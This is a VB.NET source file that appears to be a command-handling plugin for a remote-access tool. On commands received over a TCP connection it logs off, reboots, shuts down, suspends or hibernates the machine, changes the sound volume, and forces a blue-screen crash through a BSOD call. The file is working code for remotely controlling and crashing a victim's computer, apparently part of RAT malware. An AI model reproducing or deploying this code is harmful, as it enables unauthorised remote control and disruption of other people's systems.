Imports System.Net.Sockets
Imports PacketLib
Imports PacketLib.Packet
Public Class Main
    Public Shared Async Sub Main(ByVal K As TcpClient, ByVal Param_Tab As Object())
        Dim CastParam As Packet_Subject = CType(Param_Tab(0), Packet_Subject)

        Select Case CastParam
            Case Packet_Subject.LOG_OUT

                Await Task.Run(Sub() NativeAPI.PowerOptions(NativeAPI.EWX_LOGOFF, 0))

            Case Packet_Subject.REBOOT

                Await Task.Run(Sub() NativeAPI.PowerOptions(NativeAPI.EWX_REBOOT, 0 Or NativeAPI.SHTDN_REASON_MINOR_BLUESCREEN))

            Case Packet_Subject.SHUTDOWN

                Await Task.Run(Sub() NativeAPI.PowerOptions(NativeAPI.EWX_POWEROFF, 0 Or NativeAPI.SHTDN_REASON_MAJOR_SOFTWARE))

            Case Packet_Subject.BSOD

                Await Task.Run(Sub() NativeAPI.BSOD())

            Case Packet_Subject.WALLPAPER


            Case Packet_Subject.SUSPEND

                Await Task.Run(Sub() NativeAPI.HIBSUSPEND(False))
             '   NativeAPI.HIBSUSPEND(True)

            Case Packet_Subject.HIBERNATE

                Await Task.Run(Sub() NativeAPI.HIBSUSPEND(True))
                '  NativeAPI.HIBSUSPEND(False)


            Case Packet_Subject.MUTE_SOUND

                Await Task.Run(Sub() NativeAPI.AppCommand.Mute_Sound())


            Case Packet_Subject.VOL_UP

                Await Task.Run(Sub() NativeAPI.AppCommand.VolUp())

            Case Packet_Subject.VOL_DOWN

                Await Task.Run(Sub() NativeAPI.AppCommand.VolDown())


        End Select
    End Sub


End Class
